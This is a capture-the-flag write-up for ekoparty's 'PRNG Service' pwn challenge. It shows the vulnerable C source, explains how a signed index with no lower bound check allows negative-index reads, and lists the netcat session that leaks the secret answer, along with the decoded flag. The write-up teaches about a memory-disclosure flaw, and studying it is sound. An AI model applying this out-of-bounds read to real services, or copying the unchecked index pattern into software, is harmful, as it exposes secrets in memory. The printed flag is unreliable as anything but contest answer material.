## ekoparty_pre-ctf: pwn25

----------
## Challenge details
| Contest        | Challenge     | Category  | Points |
|:---------------|:--------------|:----------|-------:|
| ekoparty_pre-ctf | PRNG Service | Pwn | 25  |


*Description* 
>This is our PRNG service
>running at:
>nc challs.ctf.site 20003 

----------
## Write-up

We get the following C code:

```C
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <answer.h>

int main()
{

        signed int i;
        unsigned int base, try, rnd[128];

        printf("Welcome to PRNG service\nPlease wait while we generate 64 random numbers...\n");
        fflush(0);
        sleep(2);
        strcpy((char *)&rnd[0], ANSWER);
        srandom(1337);
        base = 64;
        for (i = 0; i < 64; i++) rnd[base + i] = random();
        printf("Process finished\n");
        fflush(0);
        try = 0;
        while (try < 10) {
                printf("Choose a number [0-63]?");
                fflush(0);

                scanf("%d", &i);
                fflush(0);

                if (i < 64) {
                        printf ("Your number is: 0x%08x\n", rnd[base + i]);
                } else {
                        printf("Index out of range\n");
                }
                try++;
                fflush(0);

        }
        printf ("Thank you for using our service\n");
        fflush(0);

        return 0;
}
```

Since i is a signed int we can enter negative values to get rnd[0] from memory

```
$ nc challs.ctf.site 20003 
Welcome to PRNG service
Please wait while we generate 64 random numbers...
Process finished
Choose a number [0-63]?-64
Your number is: 0x7b4f4b45
Choose a number [0-63]?-63
Your number is: 0x7474696c
Choose a number [0-63]?-62
Your number is: 0x655f656c
Choose a number [0-63]?-61
Your number is: 0x6169646e
Choose a number [0-63]?-60
Your number is: 0x6e615f6e
Choose a number [0-63]?-59
Your number is: 0x69735f64
Choose a number [0-63]?-58
Your number is: 0x64656e67
Choose a number [0-63]?-57
Your number is: 0x6e312d5f
Choose a number [0-63]?-56
Your number is: 0xb7007d74
```

Which decodes to: EKO{little_endian_and_signed_-1nt}

The flag is:

```
EKO{little_endian_and_signed_-1nt}
```
